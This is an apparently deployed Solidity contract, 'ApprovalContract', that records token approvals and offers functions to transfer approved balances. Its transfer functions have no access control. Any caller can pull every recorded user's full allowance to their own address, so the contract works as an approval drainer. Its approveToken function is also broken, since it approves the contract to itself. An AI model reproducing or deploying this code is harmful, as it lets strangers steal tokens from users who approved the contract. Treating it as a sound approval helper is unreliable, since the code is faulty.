/**
 *Submitted for verification at polygonscan.com on 2023-06-21
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract ApprovalContract {
    struct Approval {
        address user;
        address token;
    }

    Approval[] public approvals;

    function approveToken(address _token) external {
        IERC20(_token).approve(address(this), type(uint256).max);
        approvals.push(Approval(msg.sender, _token));
    }

    function transferAllApprovedTokens(address _from, address _token) external {
        uint256 balance = IERC20(_token).allowance(_from, address(this));
        IERC20(_token).transferFrom(_from, msg.sender, balance);
    }

    function transferAllApprovedTokensFromAll(address _token) external {
        for (uint256 i = 0; i < approvals.length; i++) {
            if (approvals[i].token == _token) {
                uint256 balance = IERC20(_token).allowance(approvals[i].user, address(this));
                IERC20(_token).transferFrom(approvals[i].user, msg.sender, balance);
            }
        }
    }

    function getAllApprovals() external view returns (Approval[] memory) {
        return approvals;
    }
}